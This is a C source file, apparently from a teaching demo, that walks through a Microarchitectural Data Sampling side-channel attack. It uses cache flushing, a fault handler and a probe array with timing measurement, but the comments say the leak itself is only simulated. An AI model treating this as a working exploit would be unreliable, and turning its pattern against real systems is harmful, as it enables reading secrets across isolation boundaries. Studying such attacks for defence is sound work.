#include "utils.c"
// --- Microarchitectural Data Sampling (MDS) Attacks ---

// A location that will store secret data, intended to be "stuck" in a CPU buffer.
volatile uint8_t secret_mds_byte = 'D';

// A memory region that will be clflushed to trigger an MDS condition
uint8_t mds_target_memory[CACHE_LINE_SIZE] __attribute__((aligned(CACHE_LINE_SIZE)));

static sigjmp_buf jmpbuf_mds;

void sigsegv_handler_mds(int sig)
{
    siglongjmp(jmpbuf_mds, 1);
}

int main_mds()
{
    common_init();
    printf("\n--- Running Microarchitectural Data Sampling (MDS) Demo ---\n");

    // Place secret data into the target memory location, which will later be flushed.
    // The idea is this data is "stuck" in a CPU buffer after the flush.
    mds_target_memory[0] = secret_mds_byte;

    // Set up signal handler (for some MDS variants that can cause faults, e.g., RIDL)
    if (signal(SIGSEGV, sigsegv_handler_mds) == SIG_ERR)
    {
        perror("signal");
        return 1;
    }

    printf("Attempting MDS-style transient read...\n");

    for (int attempt = 0; attempt < 500; ++attempt)
    {
        flush_probe_array();

        // 1. Ensure the secret is in a buffer (e.g., write to mds_target_memory, then flush)
        // This causes the line to be evicted from L1D, but its data might remain in an internal buffer.
        _mm_clflush(mds_target_memory); // Invalidate cache line, potentially leaves data in LFB
        _mm_mfence();                   // Ensure flush is architecturally complete

        // 2. Trigger the transient read from the CPU buffer
        // This involves a load that causes a microcode assist or a fault.
        // For example, a load from a non-canonical address, or a load that triggers a specific microcode flow.

        // This inline assembly *simulates* a transient load from a CPU buffer.
        // The actual trigger conditions and what data gets sampled are highly
        // specific to the MDS variant and CPU microarchitecture.
        // For ZombieLoad, it's a series of loads from a _mm_clflush'd buffer.
        // For RIDL, it's specific invalid memory accesses.

        if (sigsetjmp(jmpbuf_mds, 1) == 0)
        {
            // The following inline assembly is highly conceptual.
            // The "movb %0, %%al" is *simulating* the MDS leak.
            // A real MDS trigger would involve an instruction sequence that *causes*
            // the CPU to forward stale/buffered data to a register like AL.
            // This might involve:
            // - A load from a non-canonical address (RIDL)
            // - A division by zero (Fallout)
            // - A load after a store-forwarding stall.
            // - For Zombieload, simply repeatedly loading from `mds_target_memory` after flushing.
            __asm__ __volatile__(
                "xor %%eax, %%eax\n\t"         // Clear RAX to ensure it's "clean" before sample
                "movb %0, %%al\n\t"            // CONCEPTUAL: Secret data is speculatively forwarded to AL
                "shl $12, %%rax\n\t"           // Shift AL by cache line size
                "movq (%1, %%rax, 1), %%rbx\n" // Access probe array using sampled byte
                :
                : "r"(secret_mds_byte), "r"(probe_array) // Pass probe_array and *simulate* secret_mds_byte into AL
                : "rax", "rbx");
            // This line would cause a fault if `mds_target_memory` was truly unmapped/privileged.
            // It's here to ensure the compiler doesn't optimize away the inline asm too much.
            volatile uint8_t dummy_read = mds_target_memory[0];
        }
        else
        {
            _mm_lfence();
        }

        // --- Measurement Phase ---
        if (perform_measurement(secret_mds_byte, "MDS secret"))
        {
            return 0;
        }
    }

    printf("Failed to leak the MDS secret byte.\n");
    printf("Actual secret data: %c\n", secret_mds_byte);
    return 0;
}